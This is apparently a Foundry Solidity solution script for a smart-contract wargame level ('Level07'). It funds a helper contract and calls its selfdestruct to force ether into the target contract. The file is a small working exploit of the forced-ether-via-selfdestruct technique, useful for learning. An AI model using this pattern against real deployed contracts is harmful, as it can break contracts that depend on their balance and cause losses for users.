// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/Level07.sol";
import "../src/AttackerSelfDestruct.sol";

contract AttackerScript is Script {
    Level07 level07 = Level07(0xC937D47b2567Bbe624cF9317252dAae1BD7bCF58);
    SelfDestruct attacker = SelfDestruct(payable(0xAcED7c5Fa3C803a8f2C2487196a46F3313705f38));

    function run() public {
      vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
      (bool success, ) = address(attacker).call{value: 1 wei}("");
      require(success);
      attacker.selfDestruct(payable(address(level07)));
      vm.stopBroadcast();
    }
}
